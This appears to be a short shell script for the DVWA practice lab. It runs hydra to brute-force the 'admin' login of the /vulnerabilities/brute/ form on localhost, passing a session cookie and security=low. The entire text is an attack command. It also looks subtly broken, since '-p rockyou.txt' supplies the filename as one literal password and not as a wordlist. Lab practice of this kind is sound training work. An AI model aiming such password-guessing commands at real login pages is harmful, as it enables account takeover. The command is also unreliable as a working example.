
# $1 : valid PHPSESSID

hydra -l admin -p rockyou.txt localhost http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: PHPSESSID=$1; security=low"
